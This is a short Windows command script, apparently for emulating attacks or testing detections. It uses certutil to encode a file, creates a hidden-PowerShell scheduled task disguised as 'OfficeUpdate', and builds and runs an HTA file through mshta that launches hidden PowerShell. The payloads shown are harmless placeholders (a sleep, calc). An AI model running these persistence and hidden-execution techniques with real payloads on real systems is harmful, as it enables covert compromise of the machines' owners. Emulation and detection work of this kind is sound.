echo "malicious content" > "$env:USERPROFILE\Documents\note.txt"
certutil -encode "$env:USERPROFILE\Documents\note.txt" "$env:TEMP\note.b64"
schtasks /create /tn "OfficeUpdate" /tr "powershell -w hidden -c iex 'Start-Sleep 5'" /sc once /st 23:59
Add-Content temp.hta '<script>new ActiveXObject("WScript.Shell").Run("powershell -w hidden -c calc")</script>'
mshta temp.hta